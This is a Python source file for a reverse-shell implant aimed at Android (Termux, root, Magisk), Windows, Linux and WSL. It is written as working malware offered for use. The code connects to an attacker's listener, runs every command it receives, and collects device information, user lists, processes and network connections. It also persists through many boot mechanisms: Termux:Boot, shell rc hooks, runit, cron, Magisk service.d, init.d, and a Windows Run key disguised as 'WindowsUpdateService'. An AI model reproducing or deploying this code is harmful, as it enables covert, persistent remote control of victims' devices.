# language: Python, file: shell.py, target: Android (Termux / root / Magisk) + Windows, Linux, WSL
# made by github.com/wrxxnch  -- porta Android
# aplica persistência em TODOS os pontos disponíveis no Android
import os
import sys
import shlex
import shutil
import socket
import subprocess
import time
import tempfile

# ---------------------------------------------------------------- configuração
DEFAULT_IP = "0.0.0.0"
DEFAULT_PORT = 4444
PID_NAME = "revshell"

CREATE_NO_WINDOW = 0
if os.name == 'nt':
    try:
        CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW
    except AttributeError:
        CREATE_NO_WINDOW = 0x08000000

_CACHED_ENDPOINT = None
_CWD = os.path.expanduser("~")

# ---------------------------------------------------------------- detecção
ANDROID = False
TERMUX = False
ROOT = False

def detect_env():
    global ANDROID, TERMUX, ROOT
    if os.name != 'posix':
        return
    if os.environ.get("ANDROID_ROOT") or os.path.exists("/system/build.prop") \
       or os.path.exists("/system/bin/getprop"):
        ANDROID = True
    prefix = os.environ.get("PREFIX", "")
    if "com.termux" in prefix or os.path.isdir("/data/data/com.termux/files/usr/bin"):
        TERMUX = True
    try:
        r = subprocess.run(["su", "-c", "id"], capture_output=True, timeout=6)
        ROOT = r.returncode == 0 and b"uid=0" in r.stdout
    except Exception:
        ROOT = False

def base_dir():
    if TERMUX:
        return os.path.join(os.path.expanduser("~"), ".config", "." + PID_NAME)
    if ANDROID:
        return "/data/local/tmp/." + PID_NAME
    return os.path.join(os.path.expanduser("~"), ".config", "." + PID_NAME)

def endpoint_file():
    return os.path.join(base_dir(), "endpoint")

def pid_file():
    return os.path.join(base_dir(), "pid")

def py_bin():
    if TERMUX:
        p = os.path.join(os.environ.get("PREFIX", ""), "bin", "python")
        if os.path.exists(p):
            return p
    if sys.executable and os.path.exists(sys.executable):
        return sys.executable
    return shutil.which("python3") or shutil.which("python") or "python3"

# ---------------------------------------------------------------- endpoint
def get_target_endpoint():
    global _CACHED_ENDPOINT
    if _CACHED_ENDPOINT is not None:
        return _CACHED_ENDPOINT

    target_ip, target_port = DEFAULT_IP, DEFAULT_PORT
    arg = sys.argv[1] if len(sys.argv) > 1 else ""

    if ":" in arg:
        head, tail = arg.split(":", 1)
        if head.strip():
            target_ip = head.strip()
        if tail.strip().isdigit():
            target_port = int(tail.strip())
    else:
        try:
            with open(endpoint_file()) as f:
                saved = f.read().strip()
            if ":" in saved:
                h, t = saved.split(":", 1)
                if h.strip():
                    target_ip = h.strip()
                if t.strip().isdigit():
                    target_port = int(t.strip())
        except Exception:
            pass

        if target_ip == DEFAULT_IP and sys.stdin.isatty():
            try:
                i = input(f"IP do Listener [{DEFAULT_IP}]: ").strip()
                if i:
                    target_ip = i
                p = input(f"Porta [{DEFAULT_PORT}]: ").strip()
                if p.isdigit():
                    target_port = int(p)
            except Exception:
                pass

    _CACHED_ENDPOINT = (target_ip, target_port)
    try:
        os.makedirs(base_dir(), exist_ok=True)
        with open(endpoint_file(), "w") as f:
            f.write(f"{target_ip}:{target_port}")
    except Exception:
        pass
    return _CACHED_ENDPOINT

# ---------------------------------------------------------------- helpers
def _root_write(path, content, mode=0o755):
    d = os.path.dirname(path)
    try:
        os.makedirs(d, exist_ok=True)
        with open(path, "w") as f:
            f.write(content)
        os.chmod(path, mode)
        return True
    except Exception:
        pass
    if not ROOT:
        return False
    try:
        tmp = tempfile.NamedTemporaryFile("w", delete=False, suffix=".sh")
        tmp.write(content)
        tmp.close()
        cmd = "mkdir -p {d} && cp {s} {t} && chmod {m} {t}".format(
            d=shlex.quote(d), s=shlex.quote(tmp.name),
            t=shlex.quote(path), m=oct(mode)[2:])
        r = subprocess.run(["su", "-c", cmd], capture_output=True, timeout=15)
        return r.returncode == 0
    except Exception:
        return False

def _append_once(path, marker, block):
    """Adiciona bloco ao arquivo apenas uma vez."""
    try:
        if os.path.exists(path):
            with open(path, "r", errors="ignore") as f:
                if marker in f.read():
                    return False
            if not os.access(path, os.W_OK):
                return _root_append(path, block)
        else:
            if not os.access(os.path.dirname(path) or ".", os.W_OK):
                return _root_write(path, block, 0o644)
        with open(path, "a") as f:
            f.write(block)
        return True
    except Exception:
        return _root_append(path, block)

def _root_append(path, block):
    if not ROOT:
        return False
    try:
        tmp = tempfile.NamedTemporaryFile("w", delete=False)
        tmp.write(block)
        tmp.close()
        r = subprocess.run(["su", "-c", f"cat {shlex.quote(tmp.name)} >> {shlex.quote(path)}"],
                           capture_output=True, timeout=15)
        return r.returncode == 0
    except Exception:
        return False

# ---------------------------------------------------------------- instalação
def install_payload():
    """Copia o script para diretório estável e oculto (origem pode estar em /sdcard)."""
    dest = os.path.join(base_dir(), "shell.py")
    src = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] not in ("-", "-c", "") else ""
    os.makedirs(base_dir(), exist_ok=True)
    try:
        if src and os.path.exists(src) and os.path.abspath(dest) != src:
            shutil.copyfile(src, dest)
        elif not os.path.exists(dest):
            shutil.copyfile(__file__, dest)
        os.chmod(dest, 0o755)
    except Exception:
        if not os.path.exists(dest):
            dest = src or __file__
    return dest

def write_launcher(payload, cli_arg):
    """Launcher sh com guarda de PID para evitar múltiplas instâncias."""
    sh = "/data/data/com.termux/files/usr/bin/sh" if TERMUX else "/system/bin/sh"
    script = f"""#!{sh}
# launcher gerado
BASE="{base_dir()}"
PIDF="{pid_file()}"
if [ -f "$PIDF" ]; then
  kill -0 "$(cat "$PIDF" 2>/dev/null)" 2>/dev/null && exit 0
fi
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock >/dev/null 2>&1
cd "$HOME" 2>/dev/null
command -v crond >/dev/null 2>&1 && (crond >/dev/null 2>&1 &)
if command -v setsid >/dev/null 2>&1; then
  setsid nohup "{py_bin()}" "{payload}" "{cli_arg}" >/dev/null 2>&1 &
else
  nohup "{py_bin()}" "{payload}" "{cli_arg}" >/dev/null 2>&1 &
fi
echo $! > "$PIDF"
exit 0
"""
    path = os.path.join(base_dir(), "run.sh")
    os.makedirs(base_dir(), exist_ok=True)
    with open(path, "w") as f:
        f.write(script)
    os.chmod(path, 0o755)
    return path

# ---------------------------------------------------------------- vetores Android
def p_termux_boot(launcher):
    d = os.path.join(os.path.expanduser("~"), ".termux", "boot")
    os.makedirs(d, exist_ok=True)
    body = "#!/data/data/com.termux/files/usr/bin/sh\nsleep 25\n" \
           f"[ -x {shlex.quote(launcher)} ] && {shlex.quote(launcher)} &\n"
    with open(os.path.join(d, "00-" + PID_NAME), "w") as f:
        f.write(body)
    os.chmod(os.path.join(d, "00-" + PID_NAME), 0o755)
    return True, "script em ~/.termux/boot (requer app Termux:Boot aberto 1x)"

def p_rc_files(launcher):
    prefix = os.environ.get("PREFIX", "")
    home = os.path.expanduser("~")
    hook = f'\n# {PID_NAME}-hook\n[ -x {launcher} ] && {launcher} &\n'
    targets = [os.path.join(home, x) for x in (".bashrc", ".bash_profile", ".profile", ".zshrc")]
    if prefix:
        targets += [os.path.join(prefix, "etc", "bash.bashrc"),
                    os.path.join(prefix, "etc", "profile.d", PID_NAME + ".sh")]
    done = []
    for t in targets:
        if _append_once(t, f"# {PID_NAME}-hook", hook):
            done.append(os.path.basename(t))
    return bool(done), ("injetado em: " + ", ".join(done)) if done else "nenhum rc gravável"

def p_runit(launcher):
    prefix = os.environ.get("PREFIX", "")
    sv = os.path.join(prefix, "var", "service", PID_NAME)
    if not prefix or not os.path.isdir(os.path.join(prefix, "var", "service")):
        return False, "termux-services não instalado (pkg install termux-services)"
    os.makedirs(sv, exist_ok=True)
    with open(os.path.join(sv, "run"), "w") as f:
        f.write(f"#!/data/data/com.termux/files/usr/bin/sh\nexec {shlex.quote(launcher)}\n")
    os.chmod(os.path.join(sv, "run"), 0o755)
    open(os.path.join(sv, "down"), "a").close()
    subprocess.run(["sv-enable", PID_NAME], capture_output=True, timeout=15)
    subprocess.run(["sv", "up", PID_NAME], capture_output=True, timeout=15)
    return True, "serviço runit criado e habilitado (sobrevive ao boot)"

def p_cron(launcher):
    if not shutil.which("crontab"):
        return False, "crontab ausente (pkg install cronie)"
    line = f"@reboot {launcher}\n"
    cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=15).stdout
    if launcher in cur:
        return False, "já presente"
    p = subprocess.run(["crontab", "-"], input=cur + line, text=True, capture_output=True, timeout=15)
    subprocess.run(["crond"], capture_output=True, timeout=10)
    return p.returncode == 0, "entrada @reboot adicionada ao crontab"

def p_magisk(launcher):
    d = "/data/adb/service.d"
    if not os.path.isdir(d):
        return False, "/data/adb/service.d inexistente (sem Magisk)"
    ok = _root_write(os.path.join(d, f"{PID_NAME}.sh"),
                     f"#!/system/bin/sh\nsleep 30\n{launcher} &\n")
    return ok, "script em /data/adb/service.d (Magisk late_start)" if ok else "falha ao gravar (precisa root)"

def p_initd(launcher):
    d = "/etc/init.d"
    if not os.path.isdir(d):
        return False, "/etc/init.d inexistente"
    ok = _root_write(os.path.join(d, PID_NAME),
                     f"#!/system/bin/sh\n{launcher} &\n")
    return ok, "script em /etc/init.d" if ok else "falha ao gravar (precisa root)"

def p_job_scheduler(launcher):
    if not shutil.which("termux-job-scheduler"):
        return False, "termux-job-scheduler ausente (pkg install termux-api)"
    r = subprocess.run(["termux-job-scheduler", "--script", launcher,
                        "--period-ms", "900000", "--persisted", "true",
                        "--job-id", "4242"], capture_output=True, timeout=20)
    return r.returncode == 0, "job periódico de 15 min agendado"

def p_tasker(launcher):
    d = os.path.join(os.path.expanduser("~"), ".termux", "tasker")
    os.makedirs(d, exist_ok=True)
    dest = os.path.join(d, PID_NAME + ".sh")
    shutil.copyfile(launcher, dest)
    os.chmod(dest, 0o755)
    return True, "entrypoint para Termux:Tasker criado"

def p_adb_tmp(launcher):
    if TERMUX:
        return False, "n/a (já em Termux)"
    ok = _root_write("/data/local/tmp/" + PID_NAME + ".sh", f"#!/system/bin/sh\n{launcher} &\n")
    return ok, "staging em /data/local/tmp (disparar via adb shell)" if ok else "falha"

def persist_android():
    payload = install_payload()
    cli_arg = "%s:%s" % get_target_endpoint()
    launcher = write_launcher(payload, cli_arg)

    vectors = [("Termux:Boot", p_termux_boot), ("rc files", p_rc_files),
               ("runit service", p_runit), ("crontab @reboot", p_cron),
               ("Magisk service.d", p_magisk), ("/etc/init.d", p_initd),
               ("termux-job-scheduler", p_job_scheduler), ("Termux:Tasker", p_tasker),
               ("/data/local/tmp", p_adb_tmp)]

    out = [f"[*] payload: {payload}", f"[*] launcher: {launcher}"]
    for name, fn in vectors:
        try:
            ok, msg = fn(launcher)
            out.append(("[+] " if ok else "[-] ") + f"{name}: {msg}")
        except Exception as e:
            out.append(f"[-] {name}: {e}")
    return "\n".join(out) + "\n"

# ---------------------------------------------------------------- persistência legado
def persist():
    try:
        if ANDROID:
            return persist_android()

        current_file = os.path.abspath(sys.argv[0])
        cli_arg = "%s:%s" % get_target_endpoint()
        results = []

        if os.name == 'nt':
            appdata = os.environ.get('APPDATA', '')
            if not appdata:
                return "[-] APPDATA não encontrada.\n"
            startup = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
            dest = os.path.join(startup, os.path.basename(current_file))
            if current_file.lower() != dest.lower():
                shutil.copyfile(current_file, dest)
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "WindowsUpdateService", 0, winreg.REG_SZ,
                                  f'"{sys.executable}" "{dest}" "{cli_arg}"')
            results.append("[+] Windows: Startup + Registro")
            return "\n".join(results) + "\n"

        is_wsl = False
        try:
            with open("/proc/version") as f:
                is_wsl = "microsoft" in f.read().lower()
        except Exception:
            pass

        if is_wsl:
            try:
                raw = subprocess.run(["cmd.exe", "/c", "echo %USERPROFILE%"],
                                     capture_output=True, text=True).stdout.strip().replace('\r', '')
                win = subprocess.run(["wslpath", "-u", raw],
                                     capture_output=True, text=True).stdout.strip()
                startup = os.path.join(win, "AppData", "Roaming", "Microsoft", "Windows",
                                       "Start Menu", "Programs", "Startup")
                if os.path.exists(startup):
                    dest = os.path.join(startup, os.path.basename(current_file))
                    if current_file.lower() != dest.lower():
                        shutil.copyfile(current_file, dest)
                    subprocess.run(["cmd.exe", "/c",
                        f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                        f'/v "WindowsUpdateService" /t REG_SZ /d "python \\"{dest}\\" \\"{cli_arg}\\"" /f'],
                        capture_output=True)
                    results.append("[+] WSL->Windows: Startup + Registro")
            except Exception as e:
                results.append(f"[-] WSL->Windows: {e}")
            bashrc = os.path.join(os.path.expanduser("~"), ".bashrc")
            if _append_once(bashrc, "# Background persistence hook",
                            f'\n# Background persistence hook\n{sys.executable} {current_file} {cli_arg} >/dev/null 2>&1 &\n'):
                results.append("[+] .bashrc do WSL")
            return "\n".join(results) + "\n"

        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
        if current_file not in cur:
            subprocess.run(["crontab", "-"],
                           input=cur + f"@reboot {sys.executable} {current_file} {cli_arg} &\n",
                           text=True, capture_output=True)
            results.append("[+] Linux: crontab @reboot")
        else:
            results.append("[*] crontab já configurado")
        return "\n".join(results) + "\n"
    except Exception as e:
        return f"[-] Erro na persistência: {e}\n"

# ---------------------------------------------------------------- comandos
def _run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=25)
        return (r.stdout + r.stderr) or b"[+] sem retorno\n"
    except Exception as e:
        return f"[-] {e}\n".encode()

def list_procs():
    try:
        r = subprocess.run(["ps", "-A", "-o", "PID,USER,NAME"],
                           capture_output=True, text=True, timeout=15)
        if r.returncode == 0 and r.stdout.strip():
            return r.stdout.encode()
    except Exception:
        pass
    lines = ["PID\tCMD"]
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                with open(f"/proc/{pid}/cmdline", "rb") as f:
                    cmd = f.read().replace(b"\0", b" ").decode(errors="ignore").strip()
            except Exception:
                cmd = "?"
            lines.append(f"{pid}\t{cmd or '?'}")
    except Exception as e:
        return f"[-] {e}\n".encode()
    return ("\n".join(lines) + "\n").encode()

def net_conns():
    for cmd in (["ss", "-tunap"], ["netstat", "-tunap"], ["netstat", "-an"]):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if r.returncode == 0 and r.stdout.strip():
                return (r.stdout + r.stderr).encode()
        except Exception:
            continue
    return b"[-] ss/netstat indisponivel\n"

def sysinfo():
    parts = [" ".join(os.uname())]
    for c in (["id"], ["getprop", "ro.product.manufacturer"], ["getprop", "ro.product.model"],
              ["getprop", "ro.build.version.release"], ["getprop", "ro.build.version.sdk"]):
        try:
            r = subprocess.run(c, capture_output=True, text=True, timeout=10)
            if (r.stdout or "").strip():
                parts.append(f"{c[0]} {c[-1] if len(c) > 1 else ''}: {r.stdout.strip()}")
        except Exception:
            pass
    try:
        st = os.statvfs("/")
        parts.append("fs livre: %.1f MB" % (st.f_bavail * st.f_frsize / 1048576))
    except Exception:
        pass
    return ("\n".join(parts) + "\n").encode()

def get_help():
    return """
=============================================
        COMANDOS (ANDROID)
=============================================
 help      - este menu
 sysinfo   - dispositivo, build, id, espaço
 tasks     - processos (/proc + ps)
 users     - usuários Android (pm list users)
 netstat   - conexões ativas (ss/netstat)
 persist   - reaplicar TODOS os vetores de boot
 wake      - termux-wake-lock (evita DoS do sistema)
 battery   - dumpsys battery
 cd <dir>  - troca de diretório persistente
 exit      - encerra a sessão
=============================================
""".encode()

def list_users():
    try:
        r = subprocess.run(["pm", "list", "users"], capture_output=True, text=True, timeout=15)
        if (r.stdout or "").strip():
            return r.stdout.encode()
    except Exception:
        pass
    try:
        with open("/data/system/users/userlist.xml") as f:
            return f.read().encode()
    except Exception:
        return b"[-] sem acesso a lista de usuarios\n"

# ---------------------------------------------------------------- loop
def reverse_shell():
    global _CWD
    detect_env()
    print(persist())

    try:
        with open(pid_file(), "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    if ANDROID:
        subprocess.run(["termux-wake-lock"], capture_output=True)

    target_ip, target_port = get_target_endpoint()

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            while True:
                data = s.recv(4096)
                if not data:
                    break
                command = data.decode("utf-8", errors="ignore").strip()
                low = command.lower()

                if low == "exit":
                    s.send(b"Sessao encerrada.\n")
                    break
                elif low == "help":
                    output = get_help()
                elif low == "sysinfo":
                    output = sysinfo()
                elif low == "tasks":
                    output = list_procs()
                elif low == "users":
                    output = list_users()
                elif low == "netstat":
                    output = net_conns()
                elif low == "persist":
                    output = persist_android().encode() if ANDROID else persist().encode()
                elif low == "wake":
                    subprocess.run(["termux-wake-lock"], capture_output=True)
                    output = b"[+] wakelock ativo\n"
                elif low == "battery":
                    output = _run("dumpsys battery")
                elif low.startswith("cd "):
                    dest = os.path.expanduser(command[3:].strip().strip('"'))
                    if os.path.isdir(dest):
                        _CWD = os.path.abspath(dest)
                        output = f"[+] {_CWD}\n".encode()
                    else:
                        output = b"[-] diretorio invalido\n"
                else:
                    kwargs = {}
                    if CREATE_NO_WINDOW:
                        kwargs["creationflags"] = CREATE_NO_WINDOW
                    proc = subprocess.Popen(
                        command, shell=True, cwd=_CWD,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE, **kwargs)
                    output = proc.stdout.read() + proc.stderr.read()

                if not output:
                    output = b"[+] sem retorno\n"
                s.send(output)
        except Exception:
            time.sleep(5)
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass

if __name__ == "__main__":
    reverse_shell()
